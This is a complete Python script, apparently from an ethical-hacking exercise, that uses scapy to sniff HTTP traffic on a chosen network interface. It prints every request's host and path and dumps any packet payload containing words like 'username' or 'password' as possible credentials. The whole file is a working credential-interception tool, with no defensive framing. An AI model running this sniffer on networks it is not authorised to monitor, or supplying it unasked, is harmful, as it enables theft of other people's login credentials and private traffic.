#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Spécifiez l'interface réseau à sniffer")
    arguments = parser.parse_args()
    if not arguments.interface:
        parser.error("[-] Veuillez spécifier une interface, utilisez --help pour plus d'informations.")
    return arguments.interface

def sniff_packets(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request >> " + str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            keywords = ["username", "password", "login", "email"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\n[+] Possible credentials found >> " + load + "\n\n")
                    break

interface = get_interface()
sniff_packets(interface)
